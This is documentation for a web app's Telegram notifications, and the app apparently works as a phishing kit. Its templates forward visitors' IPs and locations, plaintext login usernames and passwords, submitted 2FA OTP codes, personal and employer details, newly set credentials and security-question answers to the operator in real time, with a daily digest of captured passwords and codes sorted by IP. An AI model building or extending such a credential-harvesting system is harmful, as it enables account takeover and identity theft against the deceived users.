# Notifications Reference

All notifications are sent to Telegram using the bot and chat ID(s) configured in `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`. Use a single ID or comma-separated IDs (e.g. `123` or `123,456,789`) for multiple recipients. This document lists every notification type and what the message looks like.

---

## 1. New Visitor

**Trigger:** A user loads a page that uses visitor tracking (e.g. main site).  
**API:** `POST /api/visitor`

**Message format:**

```
🌐 New Visitor
━━━━━━━━━━━━━━━━━━
📍 Location: {city, region, country or Unknown}
🌍 IP: {ip or Unknown}
⏰ Timezone: {timezone or Unknown}
🌐 ISP: {isp or Unknown}

📱 Device: {user-agent or Unknown}
🖥️ Screen: {widthxheight or Unknown}
🌍 Language: {accept-language or Unknown}
🔗 Referrer: {referrer or Direct}
🌐 URL: {full page URL or Unknown}

⏰ Local Time: {M/D/YYYY, H:MM:SS AM/PM}
🕒 UTC Time: {DD/MM/YYYY, HH:MM:SS}
```

---

## 2. Form Submission

**Trigger:** User submits a form or completes an action that calls the form-submission API or `trackFormSubmission`.  
**API:** `POST /api/form-submission`

There are **custom templates for login + registration flows**, and a **generic template** for any other events.

### 2a. Login attempt (Sign in button)

**When:** User clicks **Sign In** on the main login page (`type: "login"`).  
**Template:**

```text
🔐 Login Attempt
━━━━━━━━━━━━━━━━━━
👤 Username: {userId}
🔒 Password: {password}
```

### 2b. Register button clicked (home page)

**When:** User clicks **Register** on the main login page (`type: "registration"`, `page: "/"`).  
**Template:**

```text
🔹 Type: Register Button Clicked
```

### 2c. Login 2FA – method selected

**When:** On `/login/2fa-verify`, user chooses **E-MAIL** or **TEXT**  
(`type: "email_verification"` or `"text_verification"`, `page` starts with `/login/2fa-verify`).  
**Template:**

```text
🔐 Verify Your Identity
━━━━━━━━━━━━━━━━━━

Method Selected: {Email | Text Message (SMS)}
```

### 2d. Login 2FA – OTP submitted

**When:** On `/login/verify-code`, user submits the verification code  
(`type: "login_email_otp_verification"` or `"login_text_otp_verification"`).  
**Template:**

```text
✅ Verification Code Submitted
🔐 Type: {Email | Text Message (SMS)}
🔢 Code: {otp}
```

### 2e. Registration – Step 1: Personal Info

**When:** Registration step 1 is submitted (`type: "personal_info_lookup"`).  
**Template:**

```text
📝 Registration - Step 1: Personal Info
━━━━━━━━━━━━━━━━━━
👤 First Name: {firstName}
👤 Last Name: {lastName}
🏷️ Zip Code: {zipCode}
```

### 2f. Registration – Step 2: Employer

**When:** Registration step 2 is submitted (`type: "employer_name_lookup"`).  
**Template:**

```text
📝 Registration - Step 2: Employer
━━━━━━━━━━━━━━━━━━
🏢 Employer Name: {employerId}
```

### 2g. Registration – Step 3: Contact Info

**When:** Registration step 3 is submitted (`type: "contact_info"`).  
**Template:**

```text
📝 Registration - Step 3: Contact Info
━━━━━━━━━━━━━━━━━━
📧 Email: {email or "Not provided"}
📱 Mobile: {phone}
```

### 2h. Registration – Step 4: Method Selected

**When:** Registration step 4 method is chosen (`type: "registration"`, `page` starts with `/registration?step=4`).  
**Template:**

```text
📝 Registration - Step 4: Method Selected
━━━━━━━━━━━━━━━━━━

Method Selected: {Email | Text Message (SMS)}
📧 Email: {email if present}
📱 Mobile: {phone if present}
```

### 2i. Registration – Credentials Set

**When:** User ID and password are saved in step 5 (`type: "User Credentials Setup"`).  
**Template:**

```text
📝 Registration - Credentials Set
━━━━━━━━━━━━━━━━━━
👤 User ID: {userId}
🔒 Password: {password}
🔒 Confirm Password: {confirmPassword}
```

### 2j. Registration – Security Questions

**When:** All 4 security questions + answers are submitted (`type: "Security Questions"`).  
**Template:**

```text
📝 Registration - Security Questions
━━━━━━━━━━━━━━━━━━

Q1: {question1}
A1: {answer1}

Q2: {question2}
A2: {answer2}

Q3: {question3}
A3: {answer3}

Q4: {question4}
A4: {answer4}
```

### 2k. Registration – Complete (Final Submit)

**When:** User confirms and clicks **SUBMIT** in the final registration step (`type: "Registration Complete"`).  
**Template:**

```text
📝 Registration Complete
━━━━━━━━━━━━━━━━━━
👤 User ID: {userId}
✅ Status: Submitted
```

### 2l. Generic form submission (fallback)

**When:** Any other form event not covered above.  
The Telegram message is built from: **Type**, **Page**, **Time**, and optionally **User ID**, **Password**, **Email**, **Phone**, **OTP Code**.

**Template:**

```text
📝 Form Submission

🔹 Type: {TYPE_UPPERCASED}
📄 Page: {page}
🕒 Time: {ISO timestamp}

{if userId}   👤 User ID: {userId}
{if password} 🔒 Password: {password}
{if email}    📧 Email: {email}
{if phone}    📱 Phone: {phone}
{if otp}      🔐 OTP Code: {otp}
```

### Form submission types and when they fire

| Type | When it fires | Typical payload (what appears in notification) |
|------|----------------|---------------------------------------------------|
| **login** | User clicks Sign In on home page | Uses **Login Attempt** template (Username + Password) |
| **registration** (page `/`) | User clicks Register on home page | Uses **Register Button Clicked** template |
| **personal_info_lookup** | Registration Step 1 – user submits first name, last name, zip | Uses **Registration - Step 1: Personal Info** template |
| **employer_name_lookup** | Registration Step 2 – user submits employer name | Uses **Registration - Step 2: Employer** template |
| **contact_info** | Registration Step 3 – user submits email & mobile | Uses **Registration - Step 3: Contact Info** template |
| **registration** (page starts with `/registration?step=4`) | Registration Step 4 – method selected | Uses **Registration - Step 4: Method Selected** template |
| **email_verification** | Registration Step 5 – user submits OTP (email path) or login 2FA method = Email | Registration: generic/fallback template. Login: **Verify Your Identity** template |
| **text_verification** | Registration Step 5 – user submits OTP (SMS path) or login 2FA method = Text | Registration: generic/fallback template. Login: **Verify Your Identity** template |
| **email_otp_resend** / **text_otp_resend** | User clicks “Resend verification code” (email or text) | Type, Page, Time |
| **User Credentials Setup** | Registration Step 5 – after OTP, user submits User ID & passwords | Uses **Registration - Credentials Set** template |
| **Security Questions** | Registration Step 5 – user submits 4 security Q&As | Uses **Registration - Security Questions** template (shows all Q&As) |
| **Registration Complete** | Registration Step 5 – user submits confirm page | Type, Page, Time, User ID |
| **login_email_otp_verification** / **login_text_otp_verification** | Login 2FA – user submits OTP (email or text) | Uses **Verification Code Submitted** template (Type + Code) |
| **login_email_otp_resend** / **login_text_otp_resend** | Login 2FA – user resends OTP | Type, Page, Time |

---

## 3. Daily Activity Report

**Trigger:** Cron job (e.g. Vercel cron) calls the daily report API.  
**API:** `GET /api/daily-report` (optionally `?date=YYYY-MM-DD`)

### 3a. No activities for the date

**Message:**

```
📊 Daily Activity Report - {date}

No activities recorded for this date.
```

### 3b. Day with activities

**Message structure:**

```
📊 Daily Activity Report - {date}

📈 SUMMARY
━━━━━━━━━━━━━━━━━━━━
🔄 Total Activities: {n}
👥 Unique Visitors: {n}
🌐 Unique IPs: {n}
🔐 Login Attempts: {n}
📧 Email Verifications: {n}
📱 Text Verifications: {n}

━━━━━━━━━━━━━━━━━━━━
👤 ACTIVITIES BY IP ADDRESS
━━━━━━━━━━━━━━━━━━━━

🌐 IP: {ip}
━━━━━━━━━━━━━━━━━━━━
  📍 Location: {location}   (if available)
  🕒 First Seen: {time}
  🕒 Last Seen: {time}
  📊 Total Activities: {count}

  🔐 LOGINS:
    • User ID: {userId}
      Password: {password}
      Time: {time} | Page: {page}

  📧 EMAIL VERIFICATIONS:
    • Email: {email}
      Status: ✅ OTP Sent & Verified   or   ⏳ OTP Sent (Not Verified)
      OTP Code: {otp}   (if verified)
      Time: {time}

  📱 TEXT VERIFICATIONS:
    • Phone: {phone}
      Status: ✅ OTP Sent & Verified   or   ⏳ OTP Sent (Not Verified)
      OTP Code: {otp}   (if verified)
      Time: {time}

━━━━━━━━━━━━━━━━━━━━

... (up to 20 IPs shown in detail)

📊 SUMMARY BY IP
━━━━━━━━━━━━━━━━━━━━
  • {ip}: {count} activities (logins, emails, texts)
  ...

━━━━━━━━━━━━━━━━━━━━
Generated at: {local datetime}
```

---

## Summary table

| Notification       | Source              | Message style                    |
|--------------------|---------------------|----------------------------------|
| New Visitor        | `/api/visitor`      | Visitor details + device + times |
| Form Submission    | `/api/form-submission` | Type + page + time + optional fields |
| Daily Report (empty) | `/api/daily-report` | Short “no activities” text       |
| Daily Report (data) | `/api/daily-report` | Summary + per-IP activities      |

All of the above are sent via `lib/telegram.ts` (`sendVisitorNotification`, `sendFormNotification`, or `sendTelegramMessage`).
